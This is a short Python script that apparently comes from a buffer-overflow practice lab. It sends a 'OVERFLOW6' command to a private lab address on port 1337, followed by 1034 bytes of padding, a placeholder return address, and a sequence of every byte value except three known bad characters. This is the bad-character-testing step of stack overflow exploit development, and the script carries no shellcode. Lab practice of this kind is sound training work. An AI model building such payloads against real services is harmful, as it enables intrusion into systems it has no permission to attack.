import socket, struct

host, port = "10.10.243.3", 1337

command = b'OVERFLOW6 '
bad_chars = [
b'\x08',
b'\x2c',
b'\xad'
]

all_chars = bytearray(range(1,256))
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')
offset = 1034
new_eip = b'BBBB'
length = 1500

payload = b''.join([
command,
b'A'*offset,
new_eip,
all_chars,
b'C' * (length - offset - len(new_eip) - len(all_chars))

])


with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
